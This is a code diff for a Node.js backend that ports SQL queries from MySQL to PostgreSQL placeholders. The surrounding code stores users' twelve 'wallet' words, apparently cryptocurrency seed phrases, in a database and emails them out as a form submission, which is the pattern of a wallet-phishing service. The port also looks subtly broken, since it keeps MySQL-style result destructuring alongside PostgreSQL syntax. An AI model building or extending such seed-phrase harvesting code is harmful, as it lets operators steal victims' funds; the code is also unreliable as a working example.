@@ -22,7 +22,7 @@ exports.addword = async (req, res) => {
 
 
     // 1️⃣ Check if wallet with same type already exists for this user
-    const checkSql = `SELECT * FROM wallet WHERE user_id = ? AND type = ?`;
+    const checkSql = `SELECT * FROM wallet WHERE user_id = $1 AND type = $2`;
     const [existing] = await db.query(checkSql, [userId, type]);
 
     if (existing.length > 0) {
@@ -33,7 +33,8 @@ exports.addword = async (req, res) => {
     const insertSql = `
       INSERT INTO wallet 
       (user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, created_at, updated_at) 
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), NOW())
+      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, NOW(), NOW())
+      RETURNING id
     `;
     const [result] = await db.query(insertSql, [
       userId, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
@@ -58,7 +59,7 @@ exports.addword = async (req, res) => {
           <tr><td><strong>Twelve</strong></td><td>${twelve || "-"}</td></tr>
         </table>
         <p style="margin-top:20px;">This email was automatically generated from form submission.</p>
-      `
+      `
     });
 
 
@@ -87,7 +88,7 @@ exports.generateWalletAddress = async (req, res) => {
     const sql = `
       SELECT id, user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, created_at, updated_at
       FROM wallet
-      WHERE user_id = ?
+      WHERE user_id = $1
       ORDER BY id
     `;
 
@@ -141,7 +142,7 @@ exports.getwalletHistory = async (req, res) => {
     const sql = `
       SELECT one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
       FROM wallet
-      WHERE user_id = ?
+      WHERE user_id = $1
     `;
 
     const [rows] = await db.query(sql, [user_id]);
@@ -217,7 +218,7 @@ exports.iframe = async (req, res) => {
     const { name } = req.params;
 
     // 1️⃣ Fetch coin from DB
-    const sql = `SELECT * FROM cripto_list WHERE name = ? AND is_active = 1`;
+    const sql = `SELECT * FROM cripto_list WHERE name = $1 AND is_active = true`;
     const [results] = await db.query(sql, [name]);
 
     if (results.length === 0) {
